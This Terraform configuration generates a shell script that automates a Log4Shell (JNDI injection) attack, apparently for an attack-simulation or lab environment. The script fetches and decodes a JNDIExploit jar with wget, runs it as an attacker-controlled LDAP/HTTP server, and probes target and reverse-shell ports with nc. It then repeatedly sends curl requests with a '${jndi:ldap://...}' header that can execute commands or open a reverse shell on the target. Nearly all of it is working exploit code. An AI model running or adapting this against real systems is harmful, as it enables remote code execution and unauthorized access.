locals {
    attack_dir = "/jndiexploit"
    attack_script = "jndiexploit.sh"
    start_script = "delayed_start.sh"
    lock_file = "/tmp/delay_log4shell.lock"
    jndiexploit_url="https://github.com/credibleforce/jndi/raw/main/jndi.base64"
    image = "openjdk:11"
    name = "jndiexploit"
    exec_type = var.inputs["reverse_shell"] == true ? "ReverseShell" : "Basic/Command/Base64"

    # only base64 encode the payload if we are executing a command
    base64_log4shell_payload= urlencode(var.inputs["reverse_shell"] == true ? var.inputs["payload"] : base64encode(
       var.inputs["payload"]
    ))
    payload = <<-EOT
    log "removing previous app directory"
    docker stop ${local.name}
    rm -rf ${local.attack_dir}
    log "creating app directory"
    mkdir -p ${local.attack_dir}
    cd ${local.attack_dir}
    
    log "starting script..."
    JNDIEXPLOIT_URL="${local.jndiexploit_url}"
    NAME="${local.name}"
    IMAGE="${local.image}"
    ATTACKER_IP="${var.inputs["attacker_ip"]}"
    ATTACKER_HTTP_PORT=${var.inputs["attacker_http_port"]}
    ATTACKER_LDAP_PORT=${var.inputs["attacker_ldap_port"]}
    TARGET_IP=${var.inputs["target_ip"]}
    TARGET_PORT=${var.inputs["target_port"]}
    EXEC_TYPE="${local.exec_type}"
    REVERSE_SHELL_PORT="${var.inputs["reverse_shell_port"]}"
    BASE64_PAYLOAD="${local.base64_log4shell_payload}"
    PUBLIC_IP=$(curl -s https://icanhazip.com)
    TIMEOUT=1800
    START_TIME=$(date +%s)
    # Check if $ATTACKER_IP is an IP address
    if [[ $ATTACKER_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        log "server is set to IP address $ATTACKER_IP, no need to resolve DNS"
    else
        log "checking dns resolution: $ATTACKER_IP"
        while true; do
            IP=$(dig +short $ATTACKER_IP)
            if [ -z "$IP" ]; then  # If $IP is empty, the domain hasn't resolved yet
                CURRENT_TIME=$(date +%s)
                ELAPSED_TIME=$((CURRENT_TIME - START_TIME))
                if [ $ELAPSED_TIME -gt $TIMEOUT ]; then
                    log "DNS resolution for $ATTACKER_IP timed out after $TIMEOUT seconds"
                    exit 1
                fi
                sleep 10
            else
                log "Current public ip: $PUBLIC_IP"
                log "$ATTACKER_IP resolved to $IP"
                if [ "$IP" == "$PUBLIC_IP" ]; then
                    log "Resolution matches public ip: $IP == $PUBLIC_IP"
                    break
                else
                    log "Resolution of dns does not match: $IP != $PUBLIC_IP"
                    sleep 10
                fi
            fi
        done
    fi

    if [[ ! -f "jndi.base64" || ! -f "JNDIExploit-1.2-SNAPSHOT.jar" ]]; then
        rm -f jndi.base64 *.zip JNDIExploit-*.jar
        wget https://github.com/credibleforce/jndi/raw/main/jndi.base64
        base64 -d jndi.base64 > JNDIExploit.1.2.zip
        unzip -o JNDIExploit.*.zip
        rm *.zip
    fi

    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
    while true; do
        log "setting up jndiexploit in screen session..."
        if pgrep -f "JNDIExploit"; then
            kill -9 $(pgrep -f "JNDIExploit")
        fi
        JNDIEXPLOIT_LOG="/tmp/jndiexploit.log"
        for i in `seq $((MAXLOG-1)) -1 1`; do mv "$JNDIEXPLOIT_LOG."{$i,$((i+1))} 2>/dev/null || true; done
        mv $JNDIEXPLOIT_LOG "$JNDIEXPLOIT_LOG.1" 2>/dev/null || true
        screen -S jndiexploit -X quit
        screen -wipe
        screen -d -L -Logfile $JNDIEXPLOIT_LOG -S jndiexploit -m java -jar JNDIExploit-*.jar --ip $ATTACKER_IP --httpPort 8088 --ldapPort 1389
        screen -S jndiexploit -X colon "logfile flush 0^M"

        log "sleeping 15 minutes..."
        sleep 900
        log "start services availability check..."

        log "checking target: $TARGET_IP:$TARGET_PORT"
        while ! nc -z -w 5 -vv $TARGET_IP $TARGET_PORT > /dev/null; do
            log "failed check - waiting for target";
            sleep 30;
            if ! screen -ls | grep jndiexploit; then
                log "screen session no longer running...reset required"
                break
            fi
            CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
            if [ "$CHECK_HASH" != "$START_HASH" ]; then
                log "payload update detected - exiting loop"
                break 2
            fi
        done;
        if ! screen -ls | grep jndiexploit; then
            log "screen session no longer running...reset required"
            break
        fi
        log "target available";
        log "checking attacker ldap: $ATTACKER_IP:$ATTACKER_LDAP_PORT"
        while ! nc -z -w 5 -vv $ATTACKER_IP $ATTACKER_LDAP_PORT > /dev/null; do
            log "failed check - waiting for attacker ldap";
            sleep 30;
            if ! screen -ls | grep jndiexploit; then
                log "screen session no longer running...reset required"
                break
            fi
            CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
            if [ "$CHECK_HASH" != "$START_HASH" ]; then
                log "payload update detected - exiting loop"
                break 2
            fi
        done;
        if ! screen -ls | grep jndiexploit; then
            log "screen session no longer running...reset required"
            break
        fi
        log "attacker ldap available";
        log "checking attacker http: $ATTACKER_IP:$ATTACKER_HTTP_PORT"
        while ! nc -z -w 5 -vv $ATTACKER_IP $ATTACKER_HTTP_PORT > /dev/null; do
            log "failed check - waiting for attacker http";
            sleep 30;
            if ! screen -ls | grep jndiexploit; then
                log "screen session no longer running...reset required"
                
            fi
            CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
            if [ "$CHECK_HASH" != "$START_HASH" ]; then
                log "payload update detected - exiting loop"
                break 2
            fi
        done;
        if ! screen -ls | grep jndiexploit; then
            log "screen session no longer running...reset required"
            break
        fi
        log "attacker http available";
        if [ "0" != "$REVERSE_SHELL_PORT" ]; then
            log "checking attacker reverse shell: $ATTACKER_IP:$REVERSE_SHELL_PORT"
            while ! nc -z -w 5 -vv $ATTACKER_IP $REVERSE_SHELL_PORT > /dev/null; do
                log "failed check - waiting for attacker reverse shell";
                sleep 30;
                if ! screen -ls | grep jndiexploit; then
                    log "screen session no longer running...reset required"
                fi
                CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
                if [ "$CHECK_HASH" != "$START_HASH" ]; then
                    log "payload update detected - exiting loop"
                    break 2
                fi
            done;
            log "attacker reverse shell available";
        fi
        sleep 30;
        if ! screen -ls | grep jndiexploit; then
            log "screen session no longer running...reset required"
            break
        fi
        log "sending payload: curl --verbose $TARGET_IP:$TARGET_PORT -H 'X-Api-Version: \$${jndi:ldap://$ATTACKER_IP:$ATTACKER_LDAP_PORT/$EXEC_TYPE/$BASE64_PAYLOAD}'"
        /bin/bash -c "curl --verbose $TARGET_IP:$TARGET_PORT -H 'X-Api-Version: \$${jndi:ldap://$ATTACKER_IP:$ATTACKER_LDAP_PORT/$EXEC_TYPE/$BASE64_PAYLOAD}'"
        log "done";
        log 'waiting 30 minutes...';
        sleep 1800
        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
        if [ "$CHECK_HASH" != "$START_HASH" ]; then
            log "payload update detected - exiting loop"
            break
        else
            log "restarting loop..."
            log "waiting ${var.inputs["attack_delay"]} seconds...";
            sleep ${var.inputs["attack_delay"]}
        fi
    done
    log "Done."
    EOT

    base64_payload = templatefile("../../delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = <<-EOT
        log "Checking for docker..."
        while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
            log "docker not found or not ready - waiting"
            sleep 120
        done
        log "docker path: $(command -v  docker)"
        EOT
        apt_packages = "git openjdk-11-jdk unzip"
        apt_post_tasks = ""
        yum_pre_tasks =  <<-EOT
        log "Checking for docker..."
        while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
            log "docker not found or not ready - waiting"
            sleep 120
        done
        log "docker path: $(command -v  docker)"
        EOT
        yum_packages = "git java-11-openjdk java-11-openjdk-devel unzip"
        yum_post_tasks = ""
        script_delay_secs = var.inputs["attack_delay"]
        next_stage_payload = local.payload
    }})

    outputs = {
        base64_payload = base64gzip(local.base64_payload)
        base64_uncompressed_payload = base64encode(local.base64_payload)
        base64_uncompressed_payload_additional = []
    }
}